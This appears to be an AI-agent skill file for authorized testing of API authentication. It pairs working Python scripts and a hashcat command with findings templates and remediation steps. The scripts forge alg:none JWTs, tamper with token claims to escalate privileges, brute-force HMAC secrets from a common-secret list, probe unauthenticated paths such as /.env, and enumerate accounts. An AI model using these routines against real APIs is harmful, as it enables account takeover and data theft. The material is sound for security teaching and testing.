---
name: testing-api-authentication-weaknesses
description: >
  Tests API authentication mechanisms for weaknesses including broken token validation,
  missing authentication on endpoints, weak password policies, credential stuffing
  susceptibility, token leakage in URLs or logs, and session management flaws. The tester
  evaluates JWT implementation, API key handling, OAuth flows, and session token entropy
  to identify authentication bypasses. Maps to OWASP API2:2023 Broken Authentication.
  Activates for requests involving API authentication testing, token validation assessment,
  credential security testing, or API auth bypass.
domain: cybersecurity
subdomain: api-security
tags: [api-security, owasp, authentication, jwt, session-management, credential-security]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Testing API Authentication Weaknesses

## When to Use

- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment
- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)
- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed
- Testing API key generation, storage, and rotation mechanisms for predictability or leakage
- Validating session management including token expiration, revocation, and refresh token security

**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.

## Prerequisites

- Written authorization specifying target API and authentication mechanisms in scope
- Valid test credentials for at least two user roles (regular user, admin)
- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)
- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries
- Wordlists for credential testing (SecLists authentication wordlists)
- API documentation or OpenAPI specification

## Workflow

### Step 1: Authentication Mechanism Identification

```python
import requests
import json

BASE_URL = "https://target-api.example.com/api/v1"

# Probe the API to identify authentication mechanisms
auth_indicators = {
    "jwt_bearer": False,
    "api_key_header": False,
    "api_key_query": False,
    "basic_auth": False,
    "oauth2": False,
    "session_cookie": False,
    "custom_token": False,
}

# Test 1: Check unauthenticated access
resp = requests.get(f"{BASE_URL}/users/me")
print(f"Unauthenticated: {resp.status_code}")
if resp.status_code == 200:
    print("[CRITICAL] Endpoint accessible without authentication")

# Test 2: Check WWW-Authenticate header
if "WWW-Authenticate" in resp.headers:
    scheme = resp.headers["WWW-Authenticate"]
    print(f"Auth scheme advertised: {scheme}")
    if "Bearer" in scheme:
        auth_indicators["jwt_bearer"] = True
    elif "Basic" in scheme:
        auth_indicators["basic_auth"] = True

# Test 3: Login and examine tokens
login_resp = requests.post(f"{BASE_URL}/auth/login",
    json={"username": "testuser@example.com", "password": "TestPass123!"})

if login_resp.status_code == 200:
    login_data = login_resp.json()
    # Check for JWT tokens
    for key in ["token", "access_token", "jwt", "id_token"]:
        if key in login_data:
            token = login_data[key]
            if token.count('.') == 2:
                auth_indicators["jwt_bearer"] = True
                print(f"JWT found in response field: {key}")
    # Check for refresh tokens
    for key in ["refresh_token", "refresh"]:
        if key in login_data:
            print(f"Refresh token found in field: {key}")
    # Check for session cookies
    for cookie in login_resp.cookies:
        print(f"Cookie set: {cookie.name} = {cookie.value[:20]}...")
        if "session" in cookie.name.lower():
            auth_indicators["session_cookie"] = True

print(f"\nAuthentication mechanisms detected: {[k for k,v in auth_indicators.items() if v]}")
```

### Step 2: Unauthenticated Endpoint Discovery

```python
# Test all endpoints without authentication
endpoints = [
    ("GET", "/users"),
    ("GET", "/users/me"),
    ("GET", "/users/1"),
    ("GET", "/admin/users"),
    ("GET", "/admin/settings"),
    ("GET", "/health"),
    ("GET", "/metrics"),
    ("GET", "/debug"),
    ("GET", "/actuator"),
    ("GET", "/actuator/env"),
    ("GET", "/swagger.json"),
    ("GET", "/api-docs"),
    ("GET", "/graphql"),
    ("POST", "/graphql"),
    ("GET", "/config"),
    ("GET", "/internal/status"),
    ("GET", "/.env"),
    ("GET", "/status"),
    ("GET", "/info"),
    ("GET", "/version"),
]

print("Unauthenticated Endpoint Scan:")
for method, path in endpoints:
    try:
        resp = requests.request(method, f"{BASE_URL}{path}", timeout=5)
        if resp.status_code not in (401, 403):
            content_preview = resp.text[:100] if resp.text else "empty"
            print(f"  [OPEN] {method} {path} -> {resp.status_code}: {content_preview}")
    except requests.exceptions.RequestException:
        pass
```

### Step 3: JWT Token Analysis

```python
import base64
import json
import hmac
import hashlib

def decode_jwt_parts(token):
    """Decode JWT header and payload without verification."""
    parts = token.split('.')
    if len(parts) != 3:
        return None, None

    def pad_base64(s):
        return s + '=' * (4 - len(s) % 4)

    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))
    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))
    return header, payload

# Analyze the JWT token
token = login_data.get("access_token", "")
header, payload = decode_jwt_parts(token)

print(f"JWT Header: {json.dumps(header, indent=2)}")
print(f"JWT Payload: {json.dumps(payload, indent=2)}")

# Security checks
issues = []

# Check 1: Algorithm
if header.get("alg") == "none":
    issues.append("CRITICAL: Algorithm set to 'none' - token signature not verified")
if header.get("alg") in ("HS256", "HS384", "HS512"):
    issues.append("INFO: Symmetric algorithm used - check for weak/default secrets")

# Check 2: Expiration
if "exp" not in payload:
    issues.append("HIGH: No expiration claim (exp) - token never expires")
else:
    import time
    exp_time = payload["exp"]
    ttl = exp_time - time.time()
    if ttl > 86400:
        issues.append(f"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long")

# Check 3: Sensitive data in payload
sensitive_fields = ["password", "ssn", "credit_card", "secret", "private_key"]
for field in sensitive_fields:
    if field in payload:
        issues.append(f"HIGH: Sensitive field '{field}' in JWT payload")

# Check 4: Missing claims
expected_claims = ["iss", "aud", "exp", "iat", "sub"]
missing = [c for c in expected_claims if c not in payload]
if missing:
    issues.append(f"MEDIUM: Missing standard claims: {missing}")

# Check 5: Key ID
if "kid" in header:
    kid = header["kid"]
    # Test for path traversal in kid
    issues.append(f"INFO: Key ID (kid) present: {kid} - test for injection")

for issue in issues:
    print(f"  [{issue.split(':')[0]}] {issue}")
```

### Step 4: JWT Manipulation Attacks

```python
# Attack 1: Remove signature (alg: none)
def forge_none_algorithm(token):
    """Create a token with alg:none to bypass signature verification."""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    header['alg'] = 'none'
    new_header = base64.urlsafe_b64encode(
        json.dumps(header).encode()).decode().rstrip('=')
    # Variations of the none algorithm
    return [
        f"{new_header}.{parts[1]}.",
        f"{new_header}.{parts[1]}.{parts[2]}",
        f"{new_header}.{parts[1]}.e30",
    ]

# Attack 2: Modify claims without re-signing
def forge_payload(token, modifications):
    """Modify payload claims and test if server validates signature."""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    payload_data.update(modifications)
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()).decode().rstrip('=')
    return f"{parts[0]}.{new_payload}.{parts[2]}"

# Attack 3: Brute force weak HMAC secrets
COMMON_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "supersecret",
    "key", "test", "admin", "changeme", "default",
    "your-256-bit-secret", "my-secret-key", "jwt-secret",
    "s3cr3t", "secret123", "mysecretkey", "apisecret",
]

def brute_force_jwt_secret(token):
    """Try common secrets against HMAC-signed JWTs."""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):
        print("Not an HMAC token, skipping brute force")
        return None

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    signature = parts[2]

    hash_func = {
        'HS256': hashlib.sha256,
        'HS384': hashlib.sha384,
        'HS512': hashlib.sha512
    }[header['alg']]

    for secret in COMMON_JWT_SECRETS:
        expected_sig = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), signing_input, hash_func).digest()
        ).decode().rstrip('=')
        if expected_sig == signature:
            print(f"[CRITICAL] JWT secret found: '{secret}'")
            return secret

    print("No common secrets matched - consider using hashcat/john for extended brute force")
    return None

# Test all attacks
none_tokens = forge_none_algorithm(token)
for none_token in none_tokens:
    resp = requests.get(f"{BASE_URL}/users/me",
                       headers={"Authorization": f"Bearer {none_token}"})
    if resp.status_code == 200:
        print(f"[CRITICAL] alg:none bypass successful")

# Test privilege escalation via claim modification
admin_token = forge_payload(token, {"role": "admin", "is_admin": True})
resp = requests.get(f"{BASE_URL}/admin/users",
                   headers={"Authorization": f"Bearer {admin_token}"})
if resp.status_code == 200:
    print("[CRITICAL] JWT claim modification accepted without signature validation")

brute_force_jwt_secret(token)
```

### Step 5: Token Lifecycle Testing

```python
# Test 1: Token reuse after logout
logout_resp = requests.post(f"{BASE_URL}/auth/logout",
    headers={"Authorization": f"Bearer {token}"})
print(f"Logout: {logout_resp.status_code}")

# Try to use the token after logout
post_logout_resp = requests.get(f"{BASE_URL}/users/me",
    headers={"Authorization": f"Bearer {token}"})
if post_logout_resp.status_code == 200:
    print("[HIGH] Token still valid after logout - no server-side revocation")

# Test 2: Token reuse after password change
# (requires changing password and then testing old token)

# Test 3: Refresh token rotation
refresh_token = login_data.get("refresh_token")
if refresh_token:
    # Use refresh token
    refresh_resp = requests.post(f"{BASE_URL}/auth/refresh",
        json={"refresh_token": refresh_token})
    new_tokens = refresh_resp.json()

    # Try to reuse the same refresh token (should fail if rotation is implemented)
    reuse_resp = requests.post(f"{BASE_URL}/auth/refresh",
        json={"refresh_token": refresh_token})
    if reuse_resp.status_code == 200:
        print("[HIGH] Refresh token reuse allowed - no rotation implemented")

# Test 4: Token in URL (leakage risk)
resp = requests.get(f"{BASE_URL}/users/me?token={token}")
if resp.status_code == 200:
    print("[MEDIUM] Token accepted in query parameter - may leak in logs/referrer")
```

### Step 6: Password Policy and Credential Testing

```python
# Test password policy enforcement on registration/change endpoints
weak_passwords = [
    "a",           # Too short
    "password",    # Common password
    "12345678",    # Numeric only
    "abcdefgh",    # Alpha only, no complexity
    "Password1",   # Meets basic complexity but is common
    "",            # Empty
    " ",           # Whitespace
]

for pwd in weak_passwords:
    resp = requests.post(f"{BASE_URL}/auth/register",
        json={"email": f"test_{hash(pwd)%9999}@example.com",
              "password": pwd, "name": "Test User"})
    if resp.status_code in (200, 201):
        print(f"[WEAK POLICY] Password accepted: '{pwd}'")

# Test account enumeration via login response differences
valid_email = "testuser@example.com"
invalid_email = "nonexistent_user_xyz@example.com"

resp_valid = requests.post(f"{BASE_URL}/auth/login",
    json={"username": valid_email, "password": "wrongpassword"})
resp_invalid = requests.post(f"{BASE_URL}/auth/login",
    json={"username": invalid_email, "password": "wrongpassword"})

if resp_valid.text != resp_invalid.text or resp_valid.status_code != resp_invalid.status_code:
    print(f"[MEDIUM] Account enumeration possible:")
    print(f"  Valid user: {resp_valid.status_code} - {resp_valid.text[:100]}")
    print(f"  Invalid user: {resp_invalid.status_code} - {resp_invalid.text[:100]}")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Broken Authentication** | OWASP API2:2023 - weaknesses in authentication mechanisms that allow attackers to assume identities of legitimate users |
| **JWT (JSON Web Token)** | Self-contained token format with header.payload.signature structure, used for stateless API authentication |
| **Token Revocation** | Server-side mechanism to invalidate tokens before their expiration, critical for logout and password change |
| **Credential Stuffing** | Automated attack using leaked username/password pairs against authentication endpoints |
| **Account Enumeration** | Determining valid usernames through different error messages or response times for valid vs invalid accounts |
| **Refresh Token Rotation** | Security practice where each use of a refresh token generates a new one, preventing token reuse attacks |

## Tools & Systems

- **Burp Suite JWT Editor**: Extension for decoding, editing, and re-signing JWT tokens with various attack modes
- **jwt_tool**: Python tool for JWT testing with 12+ attack modes including alg:none, key confusion, and JWKS spoofing
- **hashcat**: GPU-accelerated password cracker supporting JWT HMAC secret brute-forcing (mode 16500)
- **Hydra**: Network login brute-forcer supporting HTTP form-based and API authentication testing
- **Nuclei**: Template-based scanner with authentication bypass detection templates

## Common Scenarios

### Scenario: SaaS Platform API Authentication Assessment

**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.

**Approach**:
1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role
2. Test alg:none bypass: server rejects the token (secure)
3. Brute force the HMAC secret: discover the secret is "company-jwt-secret-2023" (found using hashcat with custom wordlist)
4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints
5. Test token revocation: tokens remain valid after logout and password change (no blacklist)
6. Test refresh token: refresh token has no expiration and can be reused indefinitely
7. Find that the password reset endpoint returns different messages for valid vs invalid emails
8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication

**Pitfalls**:
- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows
- Not checking if the JWT secret is the same across all environments (dev, staging, production)
- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week
- Not testing for token leakage in server logs, URL parameters, or error messages

## Output Format

```
## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable

**ID**: API-AUTH-001
**Severity**: Critical (CVSS 9.1)
**OWASP API**: API2:2023 - Broken Authentication
**Affected Components**:
  - POST /api/v1/auth/login (token issuance)
  - All authenticated endpoints (token validation)
  - POST /api/v1/auth/logout (ineffective)

**Description**:
The API uses HS256-signed JWT tokens with a brute-forceable secret
("company-jwt-secret-2023"). An attacker who discovers this secret can
forge tokens for any user with any role, including admin. Additionally,
tokens are not revocable - logout does not invalidate the token server-side,
and the 7-day expiration means stolen tokens remain valid for extended periods.

**Attack Chain**:
1. Capture any valid JWT from authenticated session
2. Brute force the HMAC secret using hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt
3. Secret recovered in 3 minutes: "company-jwt-secret-2023"
4. Forge admin JWT: modify "role" claim to "admin", re-sign with discovered secret
5. Access admin endpoints: GET /api/v1/admin/users returns all 50,000 user accounts

**Remediation**:
1. Replace HS256 with RS256 using a 2048-bit RSA key pair
2. Use a cryptographically random secret of at least 256 bits if HMAC must be used
3. Implement token blacklisting using Redis for logout and password change events
4. Reduce token TTL to 15 minutes with refresh token rotation
5. Add `iss` and `aud` claims validation to prevent token misuse across services
```
